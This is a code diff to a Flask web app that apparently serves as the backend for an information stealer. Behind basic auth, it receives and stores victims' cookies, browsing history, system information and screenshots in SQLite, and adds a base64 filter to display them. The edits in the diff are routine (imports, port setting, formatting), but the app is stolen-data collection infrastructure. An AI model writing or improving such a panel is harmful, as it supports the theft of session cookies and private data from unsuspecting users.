@@ -1,8 +1,9 @@
+import os
+import base64
 from flask import Flask, request, render_template
 from flask_httpauth import HTTPBasicAuth
-import sqlite3, os
+import sqlite3
 from datetime import datetime
-import base64
 
 app = Flask(__name__)
 auth = HTTPBasicAuth()
@@ -34,6 +35,13 @@ def init_db():
         conn.close()
 
 init_db()
+
+# фильтр для base64
+@app.template_filter('b64encode')
+def b64encode_filter(data):
+    if data is None:
+        return ''
+    return base64.b64encode(data).decode('utf-8')
 
 @app.route('/')
 @auth.login_required
@@ -69,11 +77,14 @@ def upload_data():
 
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
-    c.execute("INSERT INTO users (username, cookies, history, system_info, screenshot, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
-              (username, cookies, history, system_info, screenshot, timestamp))
+    c.execute(
+        "INSERT INTO users (username, cookies, history, system_info, screenshot, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
+        (username, cookies, history, system_info, screenshot, timestamp)
+    )
     conn.commit()
     conn.close()
     return {'status': 'ok'}
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000)
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port)
